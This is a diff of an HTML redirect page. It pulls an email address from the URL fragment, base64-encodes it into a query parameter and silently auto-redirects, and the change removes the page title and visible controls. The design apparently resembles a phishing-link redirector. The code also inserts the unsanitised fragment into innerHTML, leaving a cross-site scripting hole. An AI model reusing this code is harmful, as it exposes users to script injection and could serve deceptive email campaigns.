@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Email Extractor + Redirect</title>
+  <title></title>
   <style>
     body {
       font-family: system-ui, sans-serif;
@@ -12,125 +12,75 @@
       padding: 0 1rem;
       line-height: 1.6;
     }
-    #output {
-      margin: 1.5rem 0;
-      padding: 1rem;
-      border: 1px solid #ddd;
-      border-radius: 8px;
-      background: #f9f9f9;
-      word-break: break-all;
-    }
     .success { color: #2e7d32; }
     .error   { color: #c62828; }
-    button {
-      padding: 0.6rem 1.2rem;
-      margin: 0.5rem 0.3rem 0 0;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-    }
-    #redirect-btn { background: #1976d2; color: white; }
-    #redirect-btn:hover { background: #1565c0; }
   </style>
 </head>
 <body>
-  <h1>Proccessing...</h1>
-  <p>Extracts email from #fragment and prepares redirect URL</p>
-
-  <div id="output">Waiting...</div>
-
-  <button id="copy-email" disabled>Copy email</button>
-  <button id="redirect-btn" disabled>Go to redirect URL</button>
+  <p>Redirecting…</p>
 
   <script>
-// ── Configurable part ────────────────────────────────────────
-const CONFIG = {
-  redirectBase: "web", // ← CHANGE THIS
-  param1Name: "ref", 
-  param1Value: "summer2025", 
-  param2Name: "source", 
-  param2Value: "email-link", 
-  companyParam: "company",
-  companyValue: "Your Company Ltd", 
-  emailParam: "md",
-  useStrongerHash: false, 
-};
+    // ── Configurable part ────────────────────────────────────────
+    const CONFIG = {
+      redirectBase: "web", // ← CHANGE THIS to your real URL, e.g. "https://app.example.com/welcome"
+      param1Name: "ref",
+      param1Value: "summer2025",
+      param2Name: "source",
+      param2Value: "email-link",
+      companyParam: "company",
+      companyValue: "Your Company Ltd",
+      emailParam: "md",
+      useStrongerHash: false,
+    };
 
-function getEmailHash(email) {
-  if (CONFIG.useStrongerHash) {
-    return btoa(email + "-salt"); // still basic obfuscation
-  }
-  return btoa(email);
-}
-
-// ── Main logic ───────────────────────────────────────────────
-const output = document.getElementById('output');
-const copyBtn = document.getElementById('copy-email');
-const redirectBtn = document.getElementById('redirect-btn');
-
-let email = "";
-let domain = "";
-let redirectURL = "";
-
-let fragment = window.location.hash.substring(1);
-if (fragment) {
-  fragment = decodeURIComponent(fragment.trim());
-}
-
-const isValidEmail = fragment && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(fragment);
-
-if (isValidEmail) {
-  email = fragment;
-  domain = email.split('@')[1] || '';
-
-  const params = new URLSearchParams();
-  params.append(CONFIG.param1Name, CONFIG.param1Value);
-  params.append(CONFIG.param2Name, CONFIG.param2Value);
-  params.append(CONFIG.companyParam, CONFIG.companyValue);
-  params.append(CONFIG.emailParam, getEmailHash(email));
-
-  redirectURL = `${CONFIG.redirectBase}?${params.toString()}`;
-
-  output.innerHTML = `
-    <strong class="success">Valid email detected → redirecting…</strong><br>
-    <strong>Email:</strong> ${email}<br>
-    <strong>Domain:</strong> ${domain || '—'}<br><br>
-    <strong>Target URL:</strong><br>
-    <code>${redirectURL}</code>
-  `;
-
-  copyBtn.disabled = false;
-  redirectBtn.disabled = false;
-
-  // ── AUTO-REDIRECT ────────────────────────────────────────
-  // Small delay so user can see the message (optional but recommended)
-  setTimeout(() => {
-    if (redirectURL) {
-      window.location.replace(redirectURL);  // replace = no back-button clutter
-      // OR: window.location.href = redirectURL;   // normal redirect (adds to history)
+    function getEmailHash(email) {
+      if (CONFIG.useStrongerHash) {
+        return btoa(email + "-salt"); // still basic obfuscation
+      }
+      return btoa(email);
     }
-  }, 1200);   // ← 1.2 seconds delay – change or remove if you want instant
 
-} else if (fragment) {
-  output.innerHTML = `<strong class="error">Invalid email:</strong><br><code>${fragment}</code>`;
-} else {
-  output.textContent = "No email found in URL (use #your@email.com)";
-}
+    // ── Main logic ───────────────────────────────────────────────
+    let fragment = window.location.hash.substring(1);
+    if (fragment) {
+      fragment = decodeURIComponent(fragment.trim());
+    }
 
-// Copy button logic remains the same
-copyBtn.addEventListener('click', async () => {
-  if (!email) return;
-  try {
-    await navigator.clipboard.writeText(email);
-    copyBtn.textContent = "Copied!";
-    setTimeout(() => copyBtn.textContent = "Copy email", 1800);
-  } catch {}
-});
+    const isValidEmail = fragment && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(fragment);
 
-// Redirect button still works as fallback
-redirectBtn.addEventListener('click', () => {
-  if (redirectURL) window.location.href = redirectURL;
-});
-</script>
+    if (isValidEmail) {
+      const email = fragment;
+
+      const params = new URLSearchParams();
+      params.append(CONFIG.param1Name,   CONFIG.param1Value);
+      params.append(CONFIG.param2Name,   CONFIG.param2Value);
+      params.append(CONFIG.companyParam, CONFIG.companyValue);
+      params.append(CONFIG.emailParam,   getEmailHash(email));
+
+      const redirectURL = `${CONFIG.redirectBase}?${params.toString()}`;
+
+      // Optional: show something briefly (can be removed completely)
+      document.body.innerHTML += `
+        <p class="success">Valid email detected → redirecting…</p>
+        <small>${redirectURL}</small>
+      `;
+
+      // Auto-redirect (1.2s delay – remove setTimeout wrapper for instant redirect)
+      setTimeout(() => {
+        window.location.replace(redirectURL);
+      }, 1200);
+    } 
+    else if (fragment) {
+      document.body.innerHTML += `
+        <p class="error">Invalid email format in URL fragment:</p>
+        <code>${fragment}</code>
+      `;
+    } 
+    else {
+      document.body.innerHTML += `
+        <p>No email found in URL.<br>Use format: <code>#someone@example.com</code></p>
+      `;
+    }
+  </script>
 </body>
 </html>
